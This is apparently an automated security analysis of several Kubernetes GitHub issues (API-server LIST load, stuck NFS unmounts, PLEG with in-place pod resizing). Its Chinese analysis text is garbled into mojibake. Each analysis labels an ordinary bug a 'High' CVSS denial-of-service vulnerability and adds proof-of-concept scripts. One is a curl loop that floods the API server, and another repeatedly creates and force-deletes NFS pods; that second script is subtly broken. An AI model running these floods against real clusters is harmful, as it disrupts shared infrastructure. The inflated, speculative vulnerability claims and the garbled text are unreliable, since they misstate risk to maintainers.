ShmemPmdMapped:        0 kB
FileHugePages:         0 kB
FilePmdMapped:         0 kB
CmaTotal:              0 kB
CmaFree:               0 kB
HugePages_Total:    2820
HugePages_Free:        0
HugePages_Rsvd:        0
HugePages_Surp:        0
Hugepagesize:       2048 kB
Hugetlb:         5775360 kB
DirectMap4k:     7577012 kB
DirectMap2M:    355958784 kB
DirectMap1G:    175112192 kB
```

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.4 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

$ uname -a
Linux n6-main-master01 5.4.0-113-generic #127-Ubuntu SMP Wed May 18 14:30:56 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux


```
</details>


#### Install tools

<details>
kubespray v2.19
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd v1.5.8
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
CNI=calico
CSI=weka-fs-plugin
</details>


### åˆ†æç»“æœ

### æ½œåœ¨çš„å®‰å…¨é£é™©åˆ†æ

**é£é™©æ¦‚è¿°ï¼š**

æ ¹æ®æ‚¨æä¾›çš„ä¿¡æ¯ï¼Œæ‚¨åœ¨ Kubernetes é›†ç¾¤ä¸­éƒ¨ç½²äº†ä¸€ä¸ª Podï¼Œå‘¨æœŸæ€§åœ°é€šè¿‡è°ƒç”¨ Kubernetes API Server çš„ `/api/v1/pods?fieldSelector=spec.nodeName%3D<node-name>` æ¥å£æ¥è·å– Pod ä¿¡æ¯ã€‚æ‚¨è§‚å¯Ÿåˆ° API Server çš„è¯·æ±‚ç‡å’Œå†…å­˜ä½¿ç”¨ç‡æ˜¾è‘—å¢åŠ ï¼Œè€Œä¸”å¤„ç† LIST åŠ¨è¯çš„ API è°ƒç”¨æ—¶å‡ºç°äº†å»¶è¿Ÿã€‚

è¿™ç§ç°è±¡è¡¨æ˜ï¼Œå½“é¢‘ç¹è°ƒç”¨åŒ…å« `fieldSelector` çš„ Pod åˆ—è¡¨æ¥å£æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´ API Server çš„èµ„æºæ¶ˆè€—å¼‚å¸¸å¢å¤§ã€‚è¿™ç§èµ„æºæ¶ˆè€—å¦‚æœè¢«æ¶æ„åˆ©ç”¨ï¼Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚

**ç¬¦åˆé£é™©åˆ¤æ–­æ ‡å‡†ï¼š**

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨ï¼š**

   æ”»å‡»è€…å¯ä»¥ç¼–å†™è„šæœ¬æˆ–éƒ¨ç½²æ¶æ„å®¹å™¨ï¼Œé¢‘ç¹ä¸”å¤§é‡åœ°å‘é€å¸¦æœ‰ç‰¹å®š `fieldSelector` çš„ Pod åˆ—è¡¨è¯·æ±‚ã€‚è¿™äº›è¯·æ±‚ä¼šå¯¼è‡´ API Server æ‰§è¡Œå¤§é‡çš„è®¡ç®—å’Œå ç”¨å†…å­˜ï¼Œä»è€Œå¯èƒ½è€—å°½æœåŠ¡å™¨èµ„æºã€‚

2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é… CVE ç¼–å·ï¼Œä½¿ç”¨ CVSS 3.1 è¯„åˆ†æ ‡å‡†æ‰“åˆ†ç»“æœåœ¨ High ä»¥ä¸Šï¼š**

   - **æ”»å‡»å‘é‡ï¼ˆAVï¼‰ï¼šç½‘ç»œï¼ˆNï¼‰** - æ”»å‡»è€…å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—® API Serverã€‚
   - **æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰ï¼šä½ï¼ˆLï¼‰** - æ”»å‡»ä¸éœ€è¦ç‰¹æ®Šæ¡ä»¶ã€‚
   - **ç‰¹æƒè¦æ±‚ï¼ˆPRï¼‰ï¼šä½ï¼ˆLï¼‰** - åªéœ€è¦æœ€ä½çš„ API è®¿é—®æƒé™ã€‚
   - **ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰ï¼šæ— ï¼ˆNï¼‰** - ä¸éœ€è¦ç”¨æˆ·äº¤äº’ã€‚
   - **å½±å“èŒƒå›´ï¼ˆSï¼‰ï¼šæœªæ”¹å˜ï¼ˆUï¼‰**
   - **æœºå¯†æ€§ï¼ˆCï¼‰ï¼šæ— å½±å“ï¼ˆNï¼‰**
   - **å®Œæ•´æ€§ï¼ˆIï¼‰ï¼šæ— å½±å“ï¼ˆNï¼‰**
   - **å¯ç”¨æ€§ï¼ˆAï¼‰ï¼šé«˜ï¼ˆHï¼‰** - å¯èƒ½å¯¼è‡´ API Server æ— æ³•æœåŠ¡ã€‚

   æ ¹æ®ä»¥ä¸ŠæŒ‡æ ‡ï¼ŒCVSS è¯„åˆ†ä¸º 7.5ï¼Œå±äº High ç­‰çº§ã€‚

### å¯èƒ½çš„å½±å“

- **æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼š** æ”»å‡»è€…å¯ä»¥è€—å°½ Kubernetes API Server çš„èµ„æºï¼Œå¯¼è‡´é›†ç¾¤ç®¡ç†åŠŸèƒ½ä¸å¯ç”¨ã€‚

- **é›†ç¾¤ä¸ç¨³å®šï¼š** API Server çš„æ€§èƒ½é—®é¢˜ä¼šå½±å“åˆ°é›†ç¾¤çš„æ­£å¸¸è°ƒåº¦å’Œæ“ä½œï¼Œå¯èƒ½å¯¼è‡´ä¸šåŠ¡ä¸­æ–­ã€‚

- **èµ„æºè€—å°½ï¼š** è¿‡é«˜çš„å†…å­˜å’Œ CPU æ¶ˆè€—å¯èƒ½å½±å“åˆ°æœåŠ¡å™¨ä¸Šçš„å…¶ä»–æœåŠ¡ï¼Œé€ æˆæ›´å¤§èŒƒå›´çš„å½±å“ã€‚

### Proof of Concept

æ”»å‡»è€…å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼é‡ç°å¹¶åˆ©ç”¨è¯¥é£é™©ï¼š

1. **ç¼–å†™è„šæœ¬ï¼š** ç¼–å†™ä¸€ä¸ªå¾ªç¯è°ƒç”¨ Kubernetes API çš„è„šæœ¬ï¼Œé¢‘ç¹åœ°å‘é€å¸¦æœ‰ `fieldSelector` çš„ Pod åˆ—è¡¨è¯·æ±‚ã€‚

   ```bash
   for i in {1..100000}
   do
     curl -k -H "Authorization: Bearer <token>" "https://<api-server>/api/v1/pods?fieldSelector=spec.nodeName=<node-name>" &
   done
   ```

2. **éƒ¨ç½²æ¶æ„ Podï¼š** éƒ¨ç½²ä¸€ä¸ªå®¹å™¨ï¼Œåœ¨å…¶ä¸­è¿è¡Œä¸Šè¿°è„šæœ¬ï¼Œä»é›†ç¾¤å†…éƒ¨å‘èµ·å¤§é‡è¯·æ±‚ã€‚

3. **æ•ˆæœéªŒè¯ï¼š** è§‚å¯Ÿ Kubernetes API Server çš„èµ„æºä½¿ç”¨æƒ…å†µï¼ŒæŸ¥çœ‹æ˜¯å¦å‡ºç°å†…å­˜æ¿€å¢ã€å“åº”å»¶è¿Ÿå’Œè¯·æ±‚å¤±è´¥ç­‰ç°è±¡ã€‚

### å»ºè®®æªæ–½

- **æƒé™æ§åˆ¶ï¼š** ä½¿ç”¨ Kubernetes çš„ RBACï¼ˆåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼‰æœºåˆ¶ï¼Œé™åˆ¶å¯¹ API çš„è®¿é—®æƒé™ï¼Œç¡®ä¿åªæœ‰å¿…è¦çš„ä¸»ä½“æ‰èƒ½è°ƒç”¨æ•æ„Ÿæ¥å£ã€‚

- **é€Ÿç‡é™åˆ¶ï¼š** é…ç½® API Server æˆ–ä½¿ç”¨ç½‘å…³ï¼Œè®¾ç½®è¯·æ±‚é€Ÿç‡é™åˆ¶ï¼Œé˜²æ­¢å•ä¸ªç”¨æˆ·å‘é€è¿‡å¤šè¯·æ±‚ã€‚

- **èµ„æºé…é¢ï¼š** å¯¹ Pod å’Œå‘½åç©ºé—´è®¾ç½®èµ„æºé…é¢ï¼Œé™åˆ¶å•ä¸ª Pod èƒ½ä½¿ç”¨çš„èµ„æºï¼Œé˜²æ­¢èµ„æºæ»¥ç”¨ã€‚

- **ç›‘æ§å‘Šè­¦ï¼š** éƒ¨ç½²ç›‘æ§ç³»ç»Ÿï¼Œå®æ—¶ç›‘æµ‹ API Server çš„æ€§èƒ½æŒ‡æ ‡å’Œå¼‚å¸¸è¯·æ±‚æ¨¡å¼ï¼ŒåŠæ—¶å‘ç°å¹¶å¤„ç†æ½œåœ¨çš„æ”»å‡»è¡Œä¸ºã€‚

### ç»“è®º

æ‚¨æè¿°çš„é—®é¢˜å­˜åœ¨è¢«åˆ©ç”¨çš„æ½œåœ¨å®‰å…¨é£é™©ï¼Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œå½±å“é›†ç¾¤çš„å¯ç”¨æ€§ã€‚å»ºè®®é‡‡å–ç›¸åº”çš„å®‰å…¨æªæ–½ï¼Œé˜²èŒƒæ½œåœ¨çš„æ”»å‡»ï¼Œä¿éšœ Kubernetes é›†ç¾¤çš„ç¨³å®šå’Œå®‰å…¨ã€‚

---

## Issue #123960 nfs umount gets stuck when pod is destroyed

- Issue é“¾æ¥ï¼š[#123960](https://github.com/kubernetes/kubernetes/issues/123960)

### Issue å†…å®¹

#### What happened?

when deleting a statefulset, the pod gets stuck in "terminating" state. The node where the pod is scheduled, develops a high iowait time. If another pod on that node fails to terminate then iowait increases with the multiple stuck nfs mounts. no way to clear the iowait, have to reboot the node.  `kubectl delete pods podname --force -n namespace` does remove the pod k8s, but does not fix the stuck nfs mount. If I dont't force delete the pod, the pod can't be restarted.

#### What did you expect to happen?

when pod is deleted the node should be able to umount the nfs mount.

#### How can we reproduce it (as minimally and precisely as possible)?

I can't reproduce the error. I have many statefulsets that are created and deleted with a random pod which gets stuck.

#### Anything else we need to know?

I am mounting a nfs volume from an external nfs server. I am not using a nfs provisioner.

```
spec:
  volumes:
    - name: data
      nfs:
        server: nfs1.storage.server.com
        path: /home/brad
```


nfs client config on node
```
[ NFSMount_Global_Options ]
        #rsize=1048576
        #wsize=1048576
        soft
        timeo=50
        nfsvers=4.1
        retry=5
```

nfs server export
```
/home  10.10.30.0/24(rw,sync,no_wdelay,no_root_squash,no_subtree_check,insecure)
```

#### Kubernetes version

<details>

```console
$ kubectl version
#Client Version: v1.28.7
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.2

```

</details>


#### Cloud provider

<details>
bare metal
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

$ uname -a
Linux adm-wk1 5.15.0-1051-kvm #56-Ubuntu SMP Thu Feb 8 23:30:16 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux


# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd 1.7.2
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
cni - flannel
csi - none
</details>


### åˆ†æç»“æœ

å­˜åœ¨æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

**åŸå› å’Œå¯èƒ½çš„å½±å“ï¼š**

1. **å¯è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ”»å‡»è€…å¦‚æœå…·å¤‡åœ¨é›†ç¾¤ä¸­åˆ›å»ºå’Œåˆ é™¤Podçš„æƒé™ï¼Œå¯èƒ½ä¼šåˆ©ç”¨è¯¥é—®é¢˜å¯¹é›†ç¾¤èŠ‚ç‚¹è¿›è¡Œæ‹’ç»æœåŠ¡ï¼ˆDenial of Serviceï¼ŒDoSï¼‰æ”»å‡»ã€‚é€šè¿‡é¢‘ç¹åˆ›å»ºå’Œåˆ é™¤æŒ‚è½½NFSå·çš„Podï¼Œè§¦å‘NFSå¸è½½å¡ä½çš„æƒ…å†µï¼Œå¯¼è‡´èŠ‚ç‚¹çš„é«˜IOç­‰å¾…ï¼ˆiowaitï¼‰ï¼Œå ç”¨ç³»ç»Ÿèµ„æºï¼Œä½¿èŠ‚ç‚¹æ— æ³•æ­£å¸¸å¤„ç†å…¶ä»–è¯·æ±‚ã€‚

2. **å¯èƒ½æˆä¸ºæ¼æ´å¹¶åˆ†é…CVEç¼–å·**ï¼šè¯¥é—®é¢˜æ¶‰åŠåˆ°ç³»ç»Ÿå¯ç”¨æ€§çš„ä¸¥é‡ä¸‹é™ï¼Œç¬¦åˆCVSS 3.1è¯„åˆ†æ ‡å‡†ä¸­å¯¹å¯ç”¨æ€§å½±å“çš„é«˜å±è¯„çº§ã€‚æ ¹æ®CVSS 3.1æ ‡å‡†ï¼Œæ”»å‡»å¤æ‚åº¦ä½ï¼ˆAttack Complexityï¼šLowï¼‰ï¼Œæ”»å‡»è€…æ— éœ€é«˜çº§æƒé™å³å¯æ‰§è¡Œï¼ˆPrivileges Requiredï¼šLowï¼‰ï¼Œå½±å“èŒƒå›´åœ¨ç½‘ç»œçº§åˆ«ï¼ˆScopeï¼šUnchangedï¼‰ï¼Œå¯¹å¯ç”¨æ€§é€ æˆé«˜å½±å“ï¼ˆAvailability Impactï¼šHighï¼‰ï¼Œç»¼åˆè¯„åˆ†å¯èƒ½è¾¾åˆ°Highä»¥ä¸Šã€‚

**Proof of Conceptï¼š**

æ”»å‡»è€…ç¼–å†™è„šæœ¬ï¼Œå¾ªç¯åˆ›å»ºå¹¶åˆ é™¤æŒ‚è½½NFSå·çš„Podï¼Œä»¥è§¦å‘NFSå¸è½½å¡ä½çš„é—®é¢˜ï¼Œå¯¼è‡´èŠ‚ç‚¹å‡ºç°é«˜iowaitï¼Œæœ€ç»ˆå¯¼è‡´èŠ‚ç‚¹ä¸å¯ç”¨ã€‚

ç¤ºä¾‹è„šæœ¬ï¼š

```bash
# åˆ›å»ºä¸€ä¸ªPodæ¨¡æ¿æ–‡ä»¶ nfs-pod.yaml
cat <<EOF > nfs-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: nfs-pod-\$(uuidgen)
spec:
  containers:
  - name: nfs-container
    image: busybox
    command: ["sleep", "3600"]
    volumeMounts:
    - name: nfs-volume
      mountPath: /mnt
  volumes:
  - name: nfs-volume
    nfs:
      server: nfs1.storage.server.com
      path: /home/brad
EOF

# å¾ªç¯åˆ›å»ºå’Œåˆ é™¤Pod
for i in \$(seq 1 100)
do
  # åˆ›å»ºPod
  kubectl apply -f nfs-pod.yaml
  # ç­‰å¾…Podè¿è¡Œ
  sleep 5
  # åˆ é™¤Pod
  kubectl delete pod nfs-pod-\$(uuidgen) --force --grace-period=0
done
```

è¯¥è„šæœ¬ä¼šåœ¨çŸ­æ—¶é—´å†…åˆ›å»ºå¹¶å¼ºåˆ¶åˆ é™¤å¤§é‡æŒ‚è½½NFSçš„Podï¼Œå¯èƒ½è§¦å‘NFSå¸è½½å¡ä½çš„é—®é¢˜ï¼Œå¯¼è‡´èŠ‚ç‚¹çš„é«˜iowaitå’Œèµ„æºè€—å°½ï¼Œå½±å“é›†ç¾¤çš„ç¨³å®šæ€§å’Œå¯ç”¨æ€§ã€‚

**æ€»ç»“ï¼š**

ç”±äºè¯¥é—®é¢˜å¯ä»¥è¢«æ”»å‡»è€…åˆ©ç”¨æ¥å¯¹é›†ç¾¤å®æ–½æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œå½±å“èŠ‚ç‚¹çš„å¯ç”¨æ€§ï¼Œç¬¦åˆåˆ†é…CVEç¼–å·çš„æ¡ä»¶ï¼ŒæŒ‰ç…§CVSS 3.1è¯„åˆ†æ ‡å‡†ï¼Œå¯èƒ½è¢«è¯„ä¸ºHighçº§åˆ«çš„æ¼æ´ã€‚

---

## Issue #123940 [FG:InPlacePodVerticalScaling] PLEG doesn't work well with alpha feature InPlacePodVerticalScaling

- Issue é“¾æ¥ï¼š[#123940](https://github.com/kubernetes/kubernetes/issues/123940)

### Issue å†…å®¹

#### What happened?

##### Background

This is a follow up issue from https://github.com/kubernetes/kubernetes/pull/120432/files#r1489932247

Originally, we fix the InPlacePodVerticalScaling performance issue by fetching the runtime status in single sync loop which is not elegant. Later, I follow @smarterclayton's suggestion to leverage PLEG to emit events to fix it. 

https://github.com/kubernetes/kubernetes/blob/89f03e3988a4e7fed90ffce22f355ff248520ad2/pkg/kubelet/kubelet.go#L1988-L1995
(InPlacePodVerticalScaling puts the resizing pod into PLEG cache for further reconcilation)

I notice there're two problems.

##### 1. There's no way to generate a PodLifecycleEvent event for resized pod.

a.  oldPod and newPod are exact same in in-place update scenarios. It can not distinguish the pod that has been resized.  Since they are same, no events would be generated.

https://github.com/kubernetes/kubernetes/blob/89f03e3988a4e7fed90ffce22f355ff248520ad2/pkg/kubelet/pleg/generic.go#L252-L257C14

b. The running pod PLEG cache are not being used at all. 
`pleg.updateCache()` will call `runtime.GetPodStatus` underneath. In VPA case, the latest CRI container status will be fetched. That means the cache store a new container status. However, it is not being used in the `Relist` flow.  I think even we use it in`pleg.Relist()`, there's no way to distinguish the resized pod based on existing fields. Please check attached code snippets of their data structures.


##### 2. plegContainerUnknown(ContainerChanged) is not correctly handled for resized container

Seems `plegContainerUnknown(ContainerChanged)` is the best state for the resized container.  However, this is not correctly handle and it was not successfully passed in the event channel. 

https://github.com/kubernetes/kubernetes/blob/89f03e3988a4e7fed90ffce22f355ff248520ad2/pkg/kubelet/pleg/generic.go#L311-L312

##### Proposal
I would suggest to remove the `kl.pleg.UpdateCache(&runningPod, pod.UID);` logic in kubelet syncPod loop since the pod would be fetched in `pleg.Relist()` and properly handle the `ContainerChanged` event.

I cut a new PR to fix this issue https://github.com/kubernetes/kubernetes/pull/123941, please check whether that makes sense?


#### What did you expect to happen?

I hope the resized container could be picked up by PLEG Relist logic (interval is 1 s) and trigger the status update and no need to wait for kubelet's next reconcile loop  (interval is 1 minute)

#### How can we reproduce it (as minimally and precisely as possible)?

1. Enable the InPlacePodVerticalScaling feature gate and start the cluster
2. Create a pod with 1c.
3. Bump to 2c.
4. Check pod container status.  `ResourceAllocated` would be updated but status won't be updated until next kubelet recocnile loop, which means normally you will wait ~1 mins.


#### Anything else we need to know?

relist pod status. The status is captured after the pod cpu was update from 1 to 2


old pod
```
{
  "ID": "4e2b3d81-129f-40e4-a579-631397aa718c",
  "Name": "tomcat",
  "Namespace": "default",
  "CreatedAt": 1710219686362299600,
  "Containers": [
    {
      "ID": "containerd://a06de85dbb87c2c0632df34b60ff9323ea29b9be362080ae75b7fdf0526e9c17",
      "Name": "tomcat",
      "Image": "sha256:ef6a7c98d192507d6066dcf24e44bec66d07ec9cf7c55d8d3d1ea0a24660bdef",
      "ImageID": "sha256:ef6a7c98d192507d6066dcf24e44bec66d07ec9cf7c55d8d3d1ea0a24660bdef",
      "ImageRef": "sha256:ef6a7c98d192507d6066dcf24e44bec66d07ec9cf7c55d8d3d1ea0a24660bdef",
      "ImageRuntimeHandler": "",
      "Hash": 2397588892,
      "HashWithoutResources": 3106650780,
      "State": "running"
    }
  ],
  "Sandboxes": [
    {
      "ID": "containerd://6bda38b639c84b369a169b94f8bf820bda49ab8f98a2ab365acc52883cebb25a",
      "Name": "",
      "Image": "",
      "ImageID": "",
      "ImageRef": "",
      "ImageRuntimeHandler": "",
      "Hash": 0,
      "HashWithoutResources": 0,
      "State": "running"
    }
  ]
}
```

newpod
```
{
  "ID": "4e2b3d81-129f-40e4-a579-631397aa718c",
  "Name": "tomcat",
  "Namespace": "default",
  "CreatedAt": 1710219686362299600,
  "Containers": [
    {
      "ID": "containerd://a06de85dbb87c2c0632df34b60ff9323ea29b9be362080ae75b7fdf0526e9c17",
      "Name": "tomcat",
      "Image": "sha256:ef6a7c98d192507d6066dcf24e44bec66d07ec9cf7c55d8d3d1ea0a24660bdef",
      "ImageID": "sha256:ef6a7c98d192507d6066dcf24e44bec66d07ec9cf7c55d8d3d1ea0a24660bdef",
      "ImageRef": "sha256:ef6a7c98d192507d6066dcf24e44bec66d07ec9cf7c55d8d3d1ea0a24660bdef",
      "ImageRuntimeHandler": "",
      "Hash": 2397588892,
      "HashWithoutResources": 3106650780,
      "State": "running"
    }
  ],
  "Sandboxes": [
    {
      "ID": "containerd://6bda38b639c84b369a169b94f8bf820bda49ab8f98a2ab365acc52883cebb25a",
      "Name": "",
      "Image": "",
      "ImageID": "",
      "ImageRef": "",
      "ImageRuntimeHandler": "",
      "Hash": 0,
      "HashWithoutResources": 0,
      "State": "running"
    }
  ]
}
```

pleg cached pod - from https://github.com/kubernetes/kubernetes/blob/89f03e3988a4e7fed90ffce22f355ff248520ad2/pkg/kubelet/kubelet.go#L1988-L1995

```
{
  "ID": "4e2b3d81-129f-40e4-a579-631397aa718c",
  "Name": "tomcat",
  "Namespace": "default",
  "IPs": [
    "10.88.0.63",
    "2001:db8:4860::3f"
  ],
  "ContainerStatuses": [
    {
      "ID": "containerd://a06de85dbb87c2c0632df34b60ff9323ea29b9be362080ae75b7fdf0526e9c17",
      "Name": "tomcat",
      "State": "running",
      "CreatedAt": "2024-03-12T05:01:27.032584855Z",
      "StartedAt": "2024-03-12T05:01:27.083899049Z",
      "FinishedAt": "0001-01-01T00:00:00Z",
      "ExitCode": 0,
      "Image": "docker.io/library/tomcat:8.0",
      "ImageID": "docker.io/library/tomcat@sha256:8ecb10948deb32c34aeadf7bf95d12a93fbd3527911fa629c1a3e7823b89ce6f",
      "ImageRef": "docker.io/library/tomcat@sha256:8ecb10948deb32c34aeadf7bf95d12a93fbd3527911fa629c1a3e7823b89ce6f",
      "ImageRuntimeHandler": "",
      "Hash": 2397588892,
      "HashWithoutResources": 3106650780,
      "RestartCount": 0,
      "Reason": "",
      "Message": "",
      "Resources": {
        "CPURequest": "2",
        "CPULimit": "2",
        "MemoryRequest": null,
        "MemoryLimit": null
      }
    }
  ],
  "SandboxStatuses": [
    {
      "id": "6bda38b639c84b369a169b94f8bf820bda49ab8f98a2ab365acc52883cebb25a",
      "metadata": {
        "name": "tomcat",
        "uid": "4e2b3d81-129f-40e4-a579-631397aa718c",
        "namespace": "default"
      },
      "created_at": 1710219686362299600,
      "network": {
        "ip": "10.88.0.63",
        "additional_ips": [
          {
            "ip": "2001:db8:4860::3f"
          }
        ]
      },
      "linux": {
        "namespaces": {
          "options": {
            "pid": 1
          }
        }
      },
      "labels": {
        "io.kubernetes.pod.name": "tomcat",
        "io.kubernetes.pod.namespace": "default",
        "io.kubernetes.pod.uid": "4e2b3d81-129f-40e4-a579-631397aa718c"
      },
      "annotations": {
        "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"tomcat\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"tomcat:8.0\",\"imagePullPolicy\":\"Always\",\"name\":\"tomcat\",\"ports\":[{\"containerPort\":7500}],\"resizePolicy\":[{\"resourceName\":\"cpu\",\"restartPolicy\":\"NotRequired\"}],\"resources\":{\"limits\":{\"cpu\":1},\"requests\":{\"cpu\":1}}}]}}\n",
        "kubernetes.io/config.seen": "2024-03-12T05:01:26.046824676Z",
        "kubernetes.io/config.source": "api"
      }
    }
  ],
  "TimeStamp": "0001-01-01T00:00:00Z"
}
```



#### Kubernetes version

master version


#### Cloud provider

Common problem so it applies to any cloud providers.

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

è¯¥Issueä¸­å­˜åœ¨æ½œåœ¨çš„å®‰å…¨é£é™©ï¼ŒåŸå› å’Œå¯èƒ½çš„å½±å“å¦‚ä¸‹ï¼š

**åŸå› ï¼š**

- åœ¨å¯ç”¨ `InPlacePodVerticalScaling` åŠŸèƒ½æ—¶ï¼ŒPLEGï¼ˆPod ç”Ÿå‘½å‘¨æœŸäº‹ä»¶ç”Ÿæˆå™¨ï¼‰æ— æ³•æ­£ç¡®å¤„ç†å·²è°ƒæ•´èµ„æºçš„Podï¼Œå¯¼è‡´Podçš„çŠ¶æ€æ›´æ–°è¢«å»¶è¿Ÿï¼Œå¯èƒ½éœ€è¦ç­‰å¾…æœ€é•¿1åˆ†é’Ÿçš„kubeletè°ƒè°å¾ªç¯æ‰èƒ½æ›´æ–°çŠ¶æ€ã€‚
- ç”±äºçŠ¶æ€æ›´æ–°çš„å»¶è¿Ÿï¼Œè°ƒåº¦å™¨å¯èƒ½æ— æ³•åŠæ—¶è·å–èŠ‚ç‚¹ä¸ŠPodçš„å®é™…èµ„æºä½¿ç”¨æƒ…å†µï¼Œå¯¼è‡´å¯¹èŠ‚ç‚¹èµ„æºçš„è®¤çŸ¥ä¸å‡†ç¡®ã€‚

**å¯èƒ½çš„å½±å“ï¼š**

- **èµ„æºè¿‡åº¦åˆ†é…æ”»å‡»**ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œé¢‘ç¹åœ°è°ƒæ•´Podçš„èµ„æºè¯·æ±‚ï¼ˆä¾‹å¦‚ï¼ŒCPUä»1æ ¸è°ƒæ•´åˆ°2æ ¸ï¼Œå†è°ƒå›1æ ¸ï¼Œåå¤è¿›è¡Œï¼‰ï¼Œè€Œç”±äºçŠ¶æ€æ›´æ–°çš„å»¶è¿Ÿï¼Œè°ƒåº¦å™¨å¯èƒ½é”™è¯¯åœ°è®¤ä¸ºèŠ‚ç‚¹æœ‰æ›´å¤šçš„å¯ç”¨èµ„æºï¼Œä»è€Œå°†æ›´å¤šçš„Podè°ƒåº¦åˆ°è¯¥èŠ‚ç‚¹ã€‚
- **æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»**ï¼šé€šè¿‡ä¸Šè¿°æ–¹å¼ï¼Œæ”»å‡»è€…èƒ½å¤Ÿå¯¼è‡´èŠ‚ç‚¹ä¸Šçš„èµ„æºè¢«è¿‡åº¦æ¶ˆè€—ï¼Œå½±å“å…¶ä»–Podçš„æ­£å¸¸è¿è¡Œï¼Œé€ æˆæœåŠ¡ä¸å¯ç”¨ã€‚

**Proof of Conceptï¼š**

1. **ç¯å¢ƒå‡†å¤‡**ï¼š

   - å¯ç”¨ `InPlacePodVerticalScaling` ç‰¹æ€§é—¨æ§å¹¶å¯åŠ¨Kubernetesé›†ç¾¤ã€‚

2. **æ”»å‡»æ­¥éª¤**ï¼š

   - **æ­¥éª¤1**ï¼šæ”»å‡»è€…åˆ›å»ºä¸€ä¸ªå¯ç”¨äº†èµ„æºè°ƒæ•´ç­–ç•¥çš„Podï¼Œåˆå§‹è¯·æ±‚èµ„æºä¸º1æ ¸CPUã€‚
   - **æ­¥éª¤2**ï¼šæ”»å‡»è€…é¢‘ç¹ä¸”å¿«é€Ÿåœ°è°ƒæ•´è¯¥Podçš„èµ„æºè¯·æ±‚ï¼Œä¾‹å¦‚æ¯éš”æ•°ç§’å°†CPUä»1æ ¸è°ƒæ•´åˆ°2æ ¸ï¼Œå†è°ƒæ•´å›1æ ¸ï¼Œåå¤è¿›è¡Œã€‚
   - **æ­¥éª¤3**ï¼šç”±äºPLEGæ— æ³•åŠæ—¶ç”ŸæˆPodç”Ÿå‘½å‘¨æœŸäº‹ä»¶ï¼Œkubeletçš„çŠ¶æ€æ›´æ–°è¢«å»¶è¿Ÿï¼Œè°ƒåº¦å™¨æ— æ³•å‡†ç¡®è·å–Podçš„å®é™…èµ„æºä½¿ç”¨æƒ…å†µã€‚
   - **æ­¥éª¤4**ï¼šè°ƒåº¦å™¨åŸºäºè¿‡æ—¶çš„èµ„æºä¿¡æ¯ï¼Œç»§ç»­åœ¨è¯¥èŠ‚ç‚¹ä¸Šè°ƒåº¦æ–°çš„Podï¼Œå¯¼è‡´èŠ‚ç‚¹èµ„æºè¢«è€—å°½ã€‚

3. **ç»“æœ**ï¼š

   - èŠ‚ç‚¹èµ„æºè¢«è¿‡åº¦æ¶ˆè€—ï¼Œå…¶ä»–Podå¯èƒ½å› ä¸ºèµ„æºä¸è¶³è€Œæ— æ³•æ­£å¸¸è¿è¡Œæˆ–è¢«é©±é€ã€‚
   - æœåŠ¡çš„å¯ç”¨æ€§å—åˆ°ä¸¥é‡å½±å“ï¼Œå¯èƒ½å¯¼è‡´é›†ç¾¤ä¸­çš„å…³é”®æœåŠ¡å‘ç”Ÿä¸­æ–­ã€‚

